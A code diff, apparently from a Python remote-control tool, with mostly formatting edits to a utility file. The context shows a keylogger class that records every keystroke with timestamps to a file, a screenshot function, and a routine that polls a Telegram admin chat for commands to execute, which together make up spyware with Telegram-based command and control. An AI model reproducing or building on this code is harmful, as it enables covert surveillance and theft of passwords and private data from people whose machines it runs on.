@@ -22,27 +22,27 @@ from PIL import ImageGrab
 class KeyLogger:
     '''this class is for keylogger utility , you should only start this class from a threading object.
     this way , the keylogger and the app itself will both run at the same time.'''
+
     def __init__(self) -> None:
         self.filename = "klog.txt"
 
-        
-
     def pressed_key(self, key):
         """if a key is presses , this function will be called and it will write data."""
-        with open(self.filename, 'a',errors='ignore') as logs:
-            logs.write('{0} {1}\n'.format(str(datetime.datetime.now()),str(key)))
+        with open(self.filename, 'a', errors='ignore') as logs:
+            logs.write('{0} {1}\n'.format(
+                str(datetime.datetime.now()), str(key)))
 
     def start(self):
         """starting point of keylogger."""
         global listener
         listener = keyboard.Listener(on_press=self.pressed_key,)
         listener.start()
-        
 
     def stop(self):
         """stops listener"""
         global listener
         listener.stop()
+
 
 def get_current_epoc_time() -> float:
     return time.time()
@@ -283,7 +283,8 @@ def extract_last_admin_command(messages: list, ADMIN_CHAT_ID: str, TELEGRAM_TOKE
             if update_id <= previous_update_id[0]:
                 logger.info(
                     f' - previous command from admin: {last_text}, "This command has already been executed"')
-                break
+                return False
+
             previous_update_id[0] = update_id
             logger.info(
                 f' - new command from admin: {last_text}')
@@ -442,4 +443,3 @@ def screenshot_pil(logger, route: str = ''):
     except Exception as error:
         logger.info(f'util.screenshot_pil error: {error}')
         return False
-
